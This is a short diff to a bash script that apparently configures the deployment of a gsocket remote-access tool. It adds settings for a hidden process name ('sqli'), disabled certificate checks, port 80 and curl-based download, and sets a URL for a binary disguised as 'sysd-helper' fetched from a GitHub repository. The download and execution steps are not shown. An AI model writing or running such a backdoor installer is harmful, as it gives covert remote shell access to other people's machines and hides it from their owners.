@@ -1,7 +1,12 @@
 #!/bin/bash
 
 set -u
-export GSOCKET_DOMAIN="gsocket.io" 
+GS_PORT=80
+GS_HIDDEN_NAME=sqli
+GS_NOCERTCHECK=1
+GS_GS_NOCERTCHECK=1
+GS_DL=curl
+
 
 # ---- Config ----
 URL="https://github.com/bkahwk-design/sutet/raw/refs/heads/main/sysd-helper"
